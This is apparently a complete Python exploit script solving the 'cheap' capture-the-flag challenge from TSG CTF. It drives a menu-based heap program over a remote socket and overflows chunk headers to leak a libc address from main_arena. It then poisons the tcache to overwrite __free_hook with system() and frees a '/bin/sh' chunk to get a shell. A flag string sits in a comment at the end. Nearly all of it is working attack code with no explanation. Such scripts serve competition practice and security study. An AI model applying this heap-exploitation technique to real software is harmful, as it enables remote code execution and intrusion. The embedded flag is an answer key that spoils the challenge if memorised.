#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './cheap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'34.146.101.4', 'port':30001})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    cheap = Cheap(conn)

    cheap.create(0x18, 'a'*8)
    cheap.remove()
    cheap.create(0x408, 'b'*8)
    cheap.remove()
    cheap.create(0x28, b'c'*0x18 + p64(0x11))
    cheap.remove()

    cheap.create(0x18, b'A'*0x18 + p64(0x431))
    cheap.remove()
    cheap.create(0x408, 'B'*8)
    cheap.remove()

    addr_libc_mainarena = u(cheap.show()) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    cheap.create(0x38, b'd'*8)
    cheap.remove()
    cheap.create(0x18, b'a'*0x18 + p64(0x31))
    cheap.remove()
    cheap.create(0x38, b'D'*8)
    cheap.remove()

    cheap.create(0x18, b'A'*0x18 + p64(0x31) + p64(addr_libc_free_hook))
    cheap.create(0x28, b'0'*8)
    cheap.create(0x28, p64(addr_libc_system))

    cheap.create(0x18, '/bin/sh')
    cheap.remove()

class Cheap:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def create(self, size, data):
        self.sendlineafter(': ', '1')
        self.sendlineafter('size: ', str(size))
        self.sendlineafter('data: ', data)

    def show(self):
        self.sendlineafter(': ', '2')
        return self.recvuntil('\n1.', drop=True)

    def remove(self):
        self.sendlineafter(': ', '3')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # TSGCTF{Heap_overflow_is_easy_and_nice_yeyey}

if __name__=='__main__':
    main()

#==========
